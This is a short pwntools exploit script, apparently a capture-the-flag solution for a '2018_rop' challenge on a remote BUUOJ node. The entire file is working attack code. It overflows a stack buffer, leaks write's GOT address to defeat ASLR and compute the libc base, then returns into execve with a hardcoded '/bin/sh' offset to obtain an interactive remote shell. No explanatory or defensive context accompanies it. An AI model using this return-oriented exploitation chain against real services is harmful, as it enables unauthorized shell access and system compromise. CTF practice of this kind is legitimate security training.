from pwn import *

#context.log_level = 'debug'

#p = process('./2018_rop')
p = remote('node3.buuoj.cn',26170)
elf = ELF('2018_rop')
libc = ELF('libc-2.27.so')

write_got = elf.got['write']
write_plt = elf.plt['write']
read_plt = elf.plt['read']
main_addr = elf.symbols['main']

payload = b'a' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

p.sendline(payload)

real_write_addr = u32(p.recv(4))

print('[+] write_got : {}'.format(real_write_addr))

#libc = LibcSearcher('write', real_write_addr)

libc_base = real_write_addr - libc.symbols['write']

print('[+] libc_base : {}'.format(libc_base))

system_addr = libc_base + libc.symbols['execve']
bin_sh = libc_base + 0x0017B8CF

payload = b'a' * (0x88 + 4) + p32(system_addr) + p32(0x123) + p32(bin_sh) + p32(0) * 2

p.sendline(payload)

p.interactive()
